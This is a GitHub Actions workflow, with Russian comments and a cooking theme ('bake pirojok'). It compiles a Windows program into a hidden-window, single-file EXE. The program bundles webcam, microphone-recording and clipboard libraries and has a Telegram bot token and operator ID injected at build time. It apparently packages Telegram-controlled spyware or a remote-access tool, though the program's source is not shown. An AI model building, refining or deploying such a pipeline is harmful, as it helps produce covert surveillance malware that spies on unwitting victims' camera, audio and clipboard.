name: Bake Pirojok v7.0

# Добавлено: принудительное использование Node.js 24
env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      version:
        description: '🍽 Version of pirojok'
        required: false
        default: '7.0.0'
      build_windows:
        description: '🥟 Build for Windows'
        type: boolean
        default: true
      build_linux:
        description: '🐧 Build for Linux'
        type: boolean
        default: false
      build_macos:
        description: '🍎 Build for macOS'
        type: boolean
        default: false

jobs:
  bake-windows-pirojok:
    if: github.event.inputs.build_windows == 'true' || github.event_name != 'workflow_dispatch'
    runs-on: windows-latest
    steps:
      - name: Get ingredients (checkout code)
        uses: actions/checkout@v5
      
      - name: Prepare kitchen (setup Python)
        uses: actions/setup-python@v5
        with:
          python-version: '3.9'
          architecture: 'x64'
      
      - name: Upgrade pip and build tools
        run: |
          python -m pip install --upgrade pip setuptools wheel
        shell: powershell
      
      - name: Install cooking tools (dependencies)
        run: |
          pip install --default-timeout=100 -r requirements.txt
          pip install pyinstaller==6.3.0
          # Проверка установки
          python -c "import cv2; print('✅ OpenCV installed:', cv2.__version__)"
          python -c "import sounddevice; print('✅ Sounddevice installed')"
          python -c "import soundfile; print('✅ Soundfile installed')"
          python -c "import win32clipboard; print('✅ pywin32 installed')"
        shell: powershell
      
      - name: Add secret ingredients (inject secrets)
        run: |
          $content = Get-Content src/pirojok.py -Raw
          $content = $content -replace 'YOUR_BOT_TOKEN_HERE', '${{ secrets.BOT_TOKEN }}'
          $content = $content -replace '123456789', '${{ secrets.TELEGRAM_ID }}'
          [System.IO.File]::WriteAllText("src/pirojok_baked.py", $content, [System.Text.Encoding]::UTF8)
        shell: powershell
      
      - name: Bake pirojok (compile with PyInstaller)
        run: |
          pyinstaller --onefile `
          --noconsole `
          --clean `
          --exclude-module tkinter `
          --exclude-module unittest `
          --exclude-module pydoc `
          --exclude-module test `
          --hidden-import cv2 `
          --hidden-import sounddevice `
          --hidden-import soundfile `
          --hidden-import win32clipboard `
          --hidden-import numpy `
          --hidden-import _cffi_backend `
          --collect-all cv2 `
          --collect-all sounddevice `
          --collect-all soundfile `
          --collect-all numpy `
          --name "Pirojok" `
          src/pirojok_baked.py
        shell: powershell
      
      - name: Check if EXE was created and show size
        run: |
          echo "Checking dist folder:"
          dir dist\
          if (Test-Path "dist\Pirojok.exe") {
            $size = (Get-Item "dist\Pirojok.exe").Length / 1MB
            echo "✅ EXE file found!"
            echo "📦 Size: $([math]::Round($size, 2)) MB"
          } else {
            echo "❌ EXE file NOT found!"
            exit 1
          }
        shell: powershell
      
      - name: Test EXE imports (optional)
        run: |
          echo "Testing if OpenCV is included..."
          & "dist\Pirojok.exe" --help 2>&1 | Out-Null
          echo "✅ Test complete"
        shell: powershell
        continue-on-error: true
      
      - name: Pack pirojok for delivery (upload artifact)
        uses: actions/upload-artifact@v4.6.2
        with:
          name: Pirojok-Windows-v${{ github.event.inputs.version }}
          path: dist/Pirojok.exe
          retention-days: 30
          if-no-files-found: error

  # Linux и macOS пока отключаем, так как основные функции для Windows
  bake-linux-pirojok:
    if: false
    runs-on: ubuntu-latest
    steps:
      - run: echo "Linux build disabled"
  
  bake-macos-pirojok:
    if: false
    runs-on: macos-latest
    steps:
      - run: echo "macOS build disabled"
